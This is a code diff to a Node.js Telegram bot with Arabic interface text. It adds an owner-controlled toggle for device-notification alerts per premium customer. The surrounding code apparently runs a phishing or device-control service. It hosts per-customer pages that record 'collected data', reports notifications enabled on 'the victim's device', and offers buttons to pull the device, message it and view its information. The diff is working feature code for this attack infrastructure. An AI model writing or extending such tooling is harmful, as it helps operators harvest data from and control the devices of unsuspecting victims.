@@ -1753,10 +1753,41 @@ bot.on('callback_query', async (q) => {
       `🔗 الرابط: \`${link}\``,
       {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
         [{text: hasAccess ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
+        [{text: prem.pushNotif===false ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
         [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
         [{text:"🔙 رجوع",callback_data:"premlist"}]
       ]})}
     );
+  }
+
+  if (data.startsWith("pg_upushtoggle_") && q.from.id === BOT_OWNER) {
+    const uid = data.replace("pg_upushtoggle_","");
+    if (!premium[uid]) return;
+    premium[uid].pushNotif = premium[uid].pushNotif === false ? true : false;
+    savePremium();
+    const enabled = premium[uid].pushNotif !== false;
+    bot.answerCallbackQuery(q.id, {text: enabled ? "🔔 تم تفعيل الإشعارات" : "🔕 تم تعطيل الإشعارات"}).catch(()=>{});
+    const prof = profiles[uid]||{};
+    const prem2 = premium[uid]||{};
+    const cfg2 = getUserPage(uid);
+    const subs2 = getUserSubs(uid);
+    const hasAccess2 = !!prem2.pageAccess;
+    const link2 = `${hostURL}/p/u/${uid}`;
+    return bot.editMessageText(
+      `🎛️ *إدارة صفحة: ${prof.name||uid}*\n\n` +
+      `🔑 الوصول: ${hasAccess2 ? "✅ مفعّل" : "🔒 معطّل"}\n` +
+      `🔔 إشعارات الجهاز: ${enabled ? "✅ مفعّلة" : "🔕 معطّلة"}\n` +
+      `📡 الحالة: ${cfg2.active ? "🟢 نشطة" : "🔴 متوقفة"}\n` +
+      `👁️ مشاهدات: ${cfg2.views||0}\n` +
+      `✅ بيانات مجموعة: ${subs2.length}\n` +
+      `🔗 الرابط: \`${link2}\``,
+      {chat_id:chatId, message_id:q.message.message_id, parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text: hasAccess2 ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
+        [{text: !enabled ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
+        [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
+        [{text:"🔙 رجوع",callback_data:"premlist"}]
+      ]})}
+    ).catch(()=>{});
   }
 
   if (data.startsWith("pg_utoggle_") && q.from.id === BOT_OWNER) {
@@ -2577,7 +2608,7 @@ app.get("/push-stream", (req, res) => {
       [{ text: "📲 سحب الجهاز", callback_data: `pull:${pid}` }, { text: "📩 إرسال رسالة", callback_data: `pushmsg:${pid}` }],
       [{ text: "📋 معلومات الجهاز", callback_data: `pushinfo:${pid}` }]
     ] }) };
-    if (isPremium(tid)) {
+    if (isPremium(tid) && premium[String(tid)]?.pushNotif !== false) {
       bot.sendMessage(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n🆔 \`${pid}\``, { parse_mode:"Markdown", ..._pushKb });
     }
     if (tid !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 \`${pid}\`\n(Creator: ${tid})`, { parse_mode:"Markdown", ..._pushKb });
